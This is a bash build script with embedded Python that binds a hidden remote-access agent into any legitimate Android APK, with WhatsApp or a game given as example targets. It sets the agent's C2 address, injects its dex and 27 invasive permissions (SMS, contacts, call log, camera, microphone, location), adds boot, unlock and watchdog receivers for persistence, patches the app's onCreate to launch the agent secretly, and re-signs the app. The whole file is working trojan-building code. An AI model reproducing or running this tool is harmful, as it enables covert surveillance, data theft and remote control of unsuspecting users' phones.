#!/usr/bin/env bash
# bind_payload.sh — Inject Andro-DLS 6-layer agent into ANY legitimate APK.
# The target app works normally. Our agent runs hidden as a service inside it.
#
# Usage: ./bind_payload.sh <legit.apk> <LHOST> <LPORT> [output.apk]
#
# Example:
#   ./bind_payload.sh whatsapp.apk 10.0.2.2 4445 trojan.apk
#   ./bind_payload.sh game.apk 10.0.2.2 4445 trojan.apk

set -euo pipefail

LEGIT_APK="${1:?usage: bind_payload.sh <legit.apk> <LHOST> <LPORT> [out.apk]}"
LHOST="${2:?...}"
LPORT="${3:?...}"
OUT="${4:-trojan.apk}"

ROOT="$(cd "$(dirname "$0")" && pwd)"
APT="${APKTOOL_JAR:-$ROOT/apktool.jar}"
SDK="${ANDROID_HOME:-/home/div-admin/Android/Sdk}"
BT="${BUILD_TOOLS:-$SDK/build-tools/35.0.0}"
ANDROID_JAR="$SDK/platforms/android-35/android.jar"
WORK="$ROOT/.payload-build/bind"
AGENT_SRC="$ROOT/agent"
JH="${JAVA_HOME:-/home/div-admin/.local/jdk-17}"

[ -f "$LEGIT_APK" ] || { echo "!! Legit APK not found: $LEGIT_APK"; exit 1; }
[ -f "$APT" ] || { echo "!! apktool.jar missing"; exit 1; }
[ -x "$BT/apksigner" ] || { echo "!! apksigner missing at $BT"; exit 1; }

PKG="com.metasploit.stage"

echo "[1/8] Decoding legitimate APK: $LEGIT_APK"
rm -rf "$WORK"
mkdir -p "$WORK"
java -jar "$APT" d "$LEGIT_APK" -f -o "$WORK/legit" >/dev/null 2>&1

# Extract original package name
ORIG_PKG=$(grep -oP 'package="[^"]*"' "$WORK/legit/AndroidManifest.xml" | head -1 | cut -d'"' -f2)
echo "  Original package: $ORIG_PKG"

echo "[2/8] Compiling agent classes..."
rm -rf "$WORK/agent-src"
mkdir -p "$WORK/agent-src"
cp "$AGENT_SRC"/*.java "$WORK/agent-src/"

# Replace C2 placeholders
python3 - "$WORK/agent-src" "$LHOST" "$LPORT" <<'PY'
import sys, pathlib
src = pathlib.Path(sys.argv[1])
for f in src.glob("*.java"):
    t = f.read_text(encoding="utf-8")
    t = t.replace("192.0.2.1", sys.argv[2])
    t = t.replace("11111", sys.argv[3])
    f.write_text(t, encoding="utf-8")
print(f"  C2 -> {sys.argv[2]}:{sys.argv[3]}")
PY

# Compile
"$JH/bin/javac" -source 8 -target 8 \
    -d "$WORK/agent-src" \
    -classpath "$ANDROID_JAR" \
    "$WORK/agent-src"/*.java 2>&1 | grep -v "warning:" || true

# Dex
"$BT/d8" --release --min-api 21 \
    --lib "$ANDROID_JAR" \
    --output "$WORK" \
    "$WORK/agent-src/com/metasploit/stage/"*.class 2>/dev/null

AGENT_DEX="$WORK/classes.dex"
[ -f "$AGENT_DEX" ] || { echo "!! Agent dex build failed"; exit 1; }
echo "  Agent dex: $(stat -c%s "$AGENT_DEX") bytes"

echo "[3/8] Injecting agent dex into APK..."
# Check if APK already has multiple dex files
DEX_COUNT=$(ls "$WORK/legit/"*.dex 2>/dev/null | wc -l)
if [ "$DEX_COUNT" -eq 0 ]; then
    # Single dex — rename to classes2.dex, add ours as classes.dex
    echo "  No existing dex — adding agent as primary dex"
    cp "$AGENT_DEX" "$WORK/legit/classes.dex"
elif [ "$DEX_COUNT" -eq 1 ]; then
    # One existing dex — add ours as classes2.dex
    echo "  One existing dex — adding agent as classes2.dex"
    cp "$AGENT_DEX" "$WORK/legit/classes2.dex"
else
    # Multiple dex — add ours as classes$((DEX_COUNT+1)).dex
    NEXT=$((DEX_COUNT + 1))
    echo "  $DEX_COUNT existing dex — adding agent as classes${NEXT}.dex"
    cp "$AGENT_DEX" "$WORK/legit/classes${NEXT}.dex"
fi

echo "[4/8] Injecting agent components into manifest..."
python3 - "$WORK/legit/AndroidManifest.xml" <<'PY'
import sys, xml.etree.ElementTree as ET

mani_path = sys.argv[1]
mani = ET.parse(mani_path)
root_el = mani.getroot()
ns = {'android': 'http://schemas.android.com/apk/res/android'}
app = root_el.find('application')
if app is None:
    app = ET.SubElement(root_el, 'application')

def attr(name):
    return '{http://schemas.android.com/apk/res/android}' + name

PKG = 'com.metasploit.stage'

# Add permissions (only if not already present)
PERMS = [
    'android.permission.INTERNET',
    'android.permission.ACCESS_NETWORK_STATE',
    'android.permission.ACCESS_WIFI_STATE',
    'android.permission.WAKE_LOCK',
    'android.permission.RECEIVE_BOOT_COMPLETED',
    'android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS',
    'android.permission.FOREGROUND_SERVICE',
    'android.permission.FOREGROUND_SERVICE_DATA_SYNC',
    'android.permission.FOREGROUND_SERVICE_SPECIAL_USE',
    'android.permission.SCHEDULE_EXACT_ALARM',
    'android.permission.READ_PHONE_STATE',
    'android.permission.READ_SMS',
    'android.permission.SEND_SMS',
    'android.permission.READ_CONTACTS',
    'android.permission.READ_CALL_LOG',
    'android.permission.ACCESS_FINE_LOCATION',
    'android.permission.ACCESS_COARSE_LOCATION',
    'android.permission.ACCESS_BACKGROUND_LOCATION',
    'android.permission.CAMERA',
    'android.permission.RECORD_AUDIO',
    'android.permission.SYSTEM_ALERT_WINDOW',
    'android.permission.READ_EXTERNAL_STORAGE',
    'android.permission.WRITE_EXTERNAL_STORAGE',
    'android.permission.READ_MEDIA_IMAGES',
    'android.permission.READ_MEDIA_AUDIO',
    'android.permission.READ_MEDIA_VIDEO',
    'android.permission.POST_NOTIFICATIONS',
]

for perm in PERMS:
    if not any(p.get('{http://schemas.android.com/apk/res/android}name') == perm
               for p in root_el.findall('uses-permission', ns)):
        elem = ET.Element('uses-permission')
        elem.set('{http://schemas.android.com/apk/res/android}name', perm)
        root_el.insert(0, elem)

# Check if our components already exist
def has_component(name):
    for child in app:
        tag = child.tag.split('}')[-1]
        if tag in ('service', 'receiver', 'activity'):
            n = child.get('{http://schemas.android.com/apk/res/android}name')
            if n and n.endswith(name):
                return True
    return False

# DlsService (foreground, START_STICKY)
if not has_component('DlsService'):
    svc = ET.SubElement(app, 'service')
    svc.set(attr('name'), f'{PKG}.DlsService')
    svc.set(attr('enabled'), 'true')
    svc.set(attr('exported'), 'false')
    svc.set(attr('foregroundServiceType'), 'dataSync')

# DlsLauncher (invisible entry point — called from original app's main activity)
if not has_component('DlsLauncher'):
    act = ET.SubElement(app, 'activity')
    act.set(attr('name'), f'{PKG}.DlsLauncher')
    act.set(attr('exported'), 'false')
    act.set(attr('theme'), '@android:style/Theme.Translucent.NoTitleBar')
    act.set(attr('excludeFromRecents'), 'true')

# BootReceiver
if not has_component('BootReceiver'):
    r = ET.SubElement(app, 'receiver')
    r.set(attr('name'), f'{PKG}.BootReceiver')
    r.set(attr('enabled'), 'true')
    r.set(attr('exported'), 'true')
    r.set(attr('directBootAware'), 'true')
    filt = ET.SubElement(r, 'intent-filter')
    for a in ['android.intent.action.BOOT_COMPLETED',
              'android.intent.action.REBOOT',
              'android.intent.action.QUICKBOOT_POWERON']:
        action = ET.SubElement(filt, 'action')
        action.set(attr('name'), a)

# UserPresentReceiver
if not has_component('UserPresentReceiver'):
    r = ET.SubElement(app, 'receiver')
    r.set(attr('name'), f'{PKG}.UserPresentReceiver')
    r.set(attr('enabled'), 'true')
    r.set(attr('exported'), 'true')
    filt = ET.SubElement(r, 'intent-filter')
    for a in ['android.intent.action.USER_PRESENT',
              'android.intent.action.USER_UNLOCKED']:
        action = ET.SubElement(filt, 'action')
        action.set(attr('name'), a)

# PowerReceiver
if not has_component('PowerReceiver'):
    r = ET.SubElement(app, 'receiver')
    r.set(attr('name'), f'{PKG}.PowerReceiver')
    r.set(attr('enabled'), 'true')
    r.set(attr('exported'), 'true')
    filt = ET.SubElement(r, 'intent-filter')
    for a in ['android.intent.action.ACTION_POWER_CONNECTED',
              'android.intent.action.ACTION_POWER_DISCONNECTED']:
        action = ET.SubElement(filt, 'action')
        action.set(attr('name'), a)

# WatchdogReceiver
if not has_component('WatchdogReceiver'):
    r = ET.SubElement(app, 'receiver')
    r.set(attr('name'), f'{PKG}.WatchdogReceiver')
    r.set(attr('enabled'), 'true')
    r.set(attr('exported'), 'true')
    filt = ET.SubElement(r, 'intent-filter')
    action = ET.SubElement(filt, 'action')
    action.set(attr('name'), 'com.metasploit.stage.WATCHDOG_FIRE')

# ResurrectionJob (JobService)
if not has_component('ResurrectionJob'):
    j = ET.SubElement(app, 'service')
    j.set(attr('name'), f'{PKG}.ResurrectionJob')
    j.set(attr('enabled'), 'true')
    j.set(attr('exported'), 'true')
    j.set(attr('permission'), 'android.permission.BIND_JOB_SERVICE')

# Write
ET.indent(root_el, space='    ')
mani.write(mani_path, encoding='utf-8', xml_declaration=True)
print("  Manifest: 8 components + 27 permissions injected")
PY

echo "[5/8] Smali conversion — adding agent entry to original MainActivity..."
# Find the original main activity and inject a call to start our service
python3 - "$WORK/legit/smali" "$PKG" <<'PY'
import sys, os, pathlib
smali_dir = pathlib.Path(sys.argv[1])
pkg = sys.argv[2]

# Find any activity that has intent-filter MAIN+LAUNCHER
# We'll inject into the first one we find
smali_files = list(smali_dir.rglob("*.smali"))

# Look for MainActivity or similar
target = None
for f in smali_files:
    if 'Main' in f.stem or 'Launch' in f.stem or 'Start' in f.stem:
        target = f
        break

if target is None:
    # Just pick the first activity-like smali
    for f in smali_files:
        t = f.read_text(encoding="utf-8", errors="ignore")
        if 'Landroid/app/Activity;' in t and 'onCreate' in t:
            target = f
            break

if target:
    print(f"  Target: {target.relative_to(smali_dir)}")
    t = target.read_text(encoding="utf-8")
    # Check if already injected
    if 'com/metasploit/stage/DlsLauncher' not in t:
        # Inject at end of onCreate method
        injection = f"""
    # === Andro-DLS: hidden agent start ===
    new-instance v0, Landroid/content/Intent;
    invoke-direct {{v0, p0, L{pkg.replace(".", "/")}/DlsLauncher;-><init>(Landroid/content/Context;)V}}, Landroid/content/Intent;
    invoke-virtual {{p0, v0}}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    # === End Andro-DLS ===
"""
        # Find end of onCreate
        if '.method protected onCreate' in t:
            # Find the return-void at end of onCreate
            lines = t.split('\n')
            in_oncreate = False
            insert_idx = None
            for i, line in enumerate(lines):
                if '.method' in line and 'onCreate' in line:
                    in_oncreate = True
                elif in_oncreate and line.strip() == '.end method':
                    insert_idx = i
                    break
            if insert_idx:
                lines.insert(insert_idx, injection)
                target.write_text('\n'.join(lines), encoding="utf-8")
                print("  Injected agent start into onCreate")
            else:
                print("  WARNING: Could not find end of onCreate")
        else:
            print("  WARNING: No onCreate method found")
    else:
        print("  Already injected")
else:
    print("  WARNING: No target activity found — agent will only start via receivers")
PY

echo "[6/8] Rebuilding APK..."
java -jar "$APT" b "$WORK/legit" -o "$WORK/rebuilt.apk" >/dev/null 2>&1

echo "[7/8] zipalign + sign..."
"$BT/zipalign" -f 4 "$WORK/rebuilt.apk" "$WORK/aligned.apk"

if [ ! -f "$ROOT/debug.keystore" ]; then
    keytool -genkeypair -keystore "$ROOT/debug.keystore" -alias androiddebugkey \
        -keyalg RSA -keysize 2048 -validity 10950 \
        -dname "CN=Android Debug,O=Android,C=US" \
        -storepass android -keypass android >/dev/null 2>&1
fi
"$BT/apksigner" sign --ks "$ROOT/debug.keystore" --ks-pass pass:android \
    --key-pass pass:android --out "$OUT" "$WORK/aligned.apk"

echo "[8/8] Verifying..."
"$BT/apksigner" verify "$OUT"

echo ""
echo "DONE: $OUT"
echo "  Bound to: $LEGIT_APK ($ORIG_PKG)"
echo "  C2: $LHOST:$LPORT"
echo "  Package: $ORIG_PKG (unchanged)"
echo "  Agent: $PKG (hidden service)"
echo ""
echo "  When user opens the app, it works normally."
echo "  Our agent starts as a hidden service in the background."
echo "  6-layer persistence ensures it stays alive."
